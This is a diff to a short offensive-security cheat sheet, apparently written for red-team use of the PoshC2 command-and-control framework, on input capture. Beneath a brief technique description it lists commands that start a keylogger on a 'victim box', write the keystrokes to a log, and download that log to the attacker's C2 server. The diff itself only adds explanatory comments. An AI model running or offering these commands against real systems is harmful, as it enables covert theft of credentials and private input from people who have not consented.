@@ -2,18 +2,19 @@
 
 ## Exploit Description: 
 Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).
+
 ---
 
 ## Exploit syntax:
 In Poshc2, Run
 ```sh
 start-keystrokes 
-##Starts the Keylogger
+##Starts the Keylogger(realtime on poshc2 Server)
 
 start-keystrokes-writefile 
-##record this file location(.log)
+##record this file location(.log) this in on victim box
 
-### Keylogger is now running until Stopped ###
+### Keylogger is now running until Stopped ### Typically used if keylogger is being ran over a set time"
 
 Download-file "C:\keylogname.log" 
 ## Gets put into /var/poshc2/*projectname*/downloads
